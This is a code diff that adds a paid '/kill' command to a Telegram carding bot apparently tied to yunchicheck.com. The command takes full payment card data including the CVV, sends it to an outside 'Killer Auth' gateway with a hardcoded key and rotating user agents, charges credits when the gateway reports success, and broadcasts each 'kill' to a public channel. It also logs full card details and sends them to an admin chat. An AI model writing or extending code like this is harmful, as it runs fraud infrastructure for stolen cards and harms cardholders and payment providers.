@@ -597,6 +597,7 @@ async function setBotCommands(): Promise<void> {
     { command: "menu", description: "Full navigation menu" },
     { command: "help", description: "View help & features" },
     { command: "mystatus", description: "Check account status" },
+    { command: "kill", description: "Kill a card (5 credits)" },
   ];
 
   const adminCommands = [
@@ -6010,6 +6011,191 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
 • 📈 Success Rate: ${successRate}%
 `, undefined, messageId);
       }
+      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    }
+
+    // /kill {cc} - Kill a card using Killer Auth gateway
+    if (text.startsWith("/kill")) {
+      const cc = text.replace("/kill", "").trim();
+      
+      if (!cc) {
+        await sendTelegramMessage(chatId, `
+❌ <b>Usage:</b> /kill <code>cc|mm|yy|cvv</code>
+
+<b>Example:</b>
+<code>/kill 4111111111111111|12|25|123</code>
+
+<b>Cost:</b> 5 credits (only charged on success)
+`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Check if user is connected
+      const { data: profile } = await supabase
+        .from("profiles")
+        .select("user_id, username, credits, is_banned")
+        .eq("telegram_chat_id", chatId)
+        .maybeSingle();
+
+      if (!profile) {
+        await sendTelegramMessage(chatId, `
+❌ <b>Account Not Connected</b>
+
+Link your Telegram to use this command.
+
+<b>Your Chat ID:</b> <code>${chatId}</code>
+
+Visit yunchicheck.com to connect.
+`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      if (profile.is_banned) {
+        await sendTelegramMessage(chatId, `🚫 <b>Account Suspended</b>\n\nYou cannot use this command while banned.`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Check credits (need at least 5 for a kill)
+      if (profile.credits < 5) {
+        await sendTelegramMessage(chatId, `
+❌ <b>Insufficient Credits</b>
+
+You need at least <b>5 credits</b> to kill a card.
+Current balance: <b>${profile.credits}</b> credits
+
+Top up at yunchicheck.com/dashboard/topup
+`, undefined, messageId);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Send processing message
+      await sendTelegramMessage(chatId, `⏳ <b>Processing...</b>\n\nChecking card with Killer Auth...`, undefined, messageId);
+
+      const startTime = Date.now();
+
+      // Call Killer Auth API (same logic as killer-auth-check edge function)
+      const userAgents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      ];
+      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
+      const apiUrl = `https://killer-2-gates-pyjk.vercel.app/ko/cc=${cc}?key=anmokupvttt`;
+
+      let isKilled = false;
+      let apiMessage = "Unknown error";
+
+      try {
+        const response = await fetch(apiUrl, {
+          method: 'GET',
+          headers: {
+            'User-Agent': userAgent,
+            'Accept': 'application/json, text/plain, */*',
+          }
+        });
+        
+        const rawText = await response.text();
+        console.log(`[KILL BOT] API response for ${profile.username}: ${rawText}`);
+        
+        // Check for success - only "KILLED SUCCESSFULLY" means killed
+        isKilled = rawText.includes("KILLED SUCCESSFULLY");
+        apiMessage = rawText;
+      } catch (error) {
+        console.error("[KILL BOT] API error:", error);
+        apiMessage = error instanceof Error ? error.message : "API connection failed";
+      }
+
+      const executionTime = ((Date.now() - startTime) / 1000).toFixed(2);
+      
+      // Mask card for display
+      const cardParts = cc.split("|");
+      const maskedCard = cardParts.length >= 1 
+        ? `${cardParts[0].substring(0, 6)}******${cardParts[0].slice(-4)}`
+        : "Invalid card";
+
+      if (isKilled) {
+        // Deduct 5 credits for successful kill
+        const newCredits = profile.credits - 5;
+        await supabase
+          .from("profiles")
+          .update({ credits: newCredits, updated_at: new Date().toISOString() })
+          .eq("user_id", profile.user_id);
+
+        // Log the card check
+        await supabase.from("card_checks").insert({
+          user_id: profile.user_id,
+          card_details: cc,
+          gateway: "killer_auth",
+          status: "completed",
+          result: "killed"
+        });
+
+        // Broadcast to public channel (fire-and-forget)
+        fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
+          },
+          body: JSON.stringify({
+            user_id: profile.user_id,
+            card_details: maskedCard,
+            status: "KILLED",
+            response_message: "KILLED SUCCESSFULLY",
+            amount: "5 credits",
+            gateway: "Killer Auth",
+          }),
+        }).catch(err => console.error("[KILL BOT] Broadcast error:", err));
+
+        await sendTelegramMessage(chatId, `
+🟢 <b>KILLED SUCCESSFULLY</b> 🔥
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>Card:</b> <code>${escapeHtml(maskedCard)}</code>
+<b>Gateway:</b> Killer Auth
+<b>Time:</b> ${executionTime}s
+━━━━━━━━━━━━━━━━━━━━━━
+
+💰 <b>-5 credits</b> | Balance: <b>${newCredits}</b>
+`);
+      } else {
+        // Log the failed check (no credits deducted)
+        await supabase.from("card_checks").insert({
+          user_id: profile.user_id,
+          card_details: cc,
+          gateway: "killer_auth",
+          status: "completed",
+          result: "unknown"
+        });
+
+        // Send admin debug for unknown results
+        if (ADMIN_TELEGRAM_CHAT_ID) {
+          sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, `
+🔍 <b>Killer Auth Debug</b>
+
+<b>User:</b> ${escapeHtml(profile.username || "Unknown")}
+<b>Card:</b> <code>${escapeHtml(cc)}</code>
+<b>Status:</b> UNKNOWN
+
+<b>Raw Response:</b>
+<pre>${escapeHtml(apiMessage.substring(0, 1500))}</pre>
+`).catch(() => {});
+        }
+
+        await sendTelegramMessage(chatId, `
+🔴 <b>NOT KILLED</b>
+
+━━━━━━━━━━━━━━━━━━━━━━
+<b>Card:</b> <code>${escapeHtml(maskedCard)}</code>
+<b>Gateway:</b> Killer Auth
+<b>Status:</b> UNKNOWN
+<b>Time:</b> ${executionTime}s
+━━━━━━━━━━━━━━━━━━━━━━
+
+💰 <b>Free</b> | Balance: <b>${profile.credits}</b>
+`);
+      }
+
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
